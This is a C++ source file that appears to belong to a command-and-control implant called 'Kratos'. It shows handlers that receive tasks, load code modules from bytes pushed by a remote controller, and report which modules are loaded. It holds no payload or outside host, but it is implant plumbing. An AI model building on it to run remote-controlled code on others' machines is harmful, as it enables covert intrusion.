#include "agent/core.h"
#include "modules/modules.h"
#include "packager/packager.h"


// [TaskID] [ModuleBit] -> per command args
void Kratos::runModuleCmd() {
	INT32 TaskID = packager->UnPack4();
	INT32 ModuleBit = packager->UnPack4( );
	packager->Pack4(TaskID);

	if ( ! modules->RunModuleCommand( ModuleBit ) ) {
		return;
	}
}

void Kratos::moduleLoad() {
	DEBUG_LOG("[+] Loading Module");
	INT32 TaskID   = packager->UnPack4( );
	INT32 ModuleBit = packager->UnPack4( );
	packager->Pack4(TaskID);

	if (modules->IsModuleLoaded(ModuleBit)) {
		DEBUG_LOG("[!] Module Loaded!");

		packager->Pack4(OUTPUT_ERROR);
		packager->Pack4(ERROR_MODULE_LOADED);
		INT32 ModuleSize  = packager->UnPack4( );
		packager->UnPackBytes( ModuleSize );
		return;
	}

	INT32 ModuleSize  = packager->UnPack4( );
	PBYTE ModuleBytes = packager->UnPackBytes( ModuleSize );

	if ( ! modules->LoadModule( ModuleBytes, ModuleSize, ModuleBit ) ) {
		DEBUG_LOG("[+] Failed Loading Modules");

		packager->Pack4(OUTPUT_ERROR);
		packager->Pack4(ERROR_MODULE_LOAD_FAILURE);
		return;
	}
	DEBUG_LOG("[+]  Module Loaded");


	packager->Pack4(OUTPUT_SUCCESS);
	packager->Pack4(SUCCESS_MODULE_LOAD);
	kratos->apis.LocalFree(ModuleBytes);
	return;
}


void Kratos::moduleList() {
	INT32 TaskID   = packager->UnPack4( );
	INT32 ModuleBit = packager->UnPack4( );
	packager->Pack4(TaskID);

	auto bits = modules->GetLoadedModulesBitMap();
	packager->Pack4(OUTPUT_NO_PARSE);
	packager->Pack8(bits);
}


void Kratos::moduleUnload() {
	//INT32 TaskID   = packager->UnPack4( );
	//INT32 ModuleBit = packager->UnPack4( );
	//packager->Pack4(TaskID);

	return;
}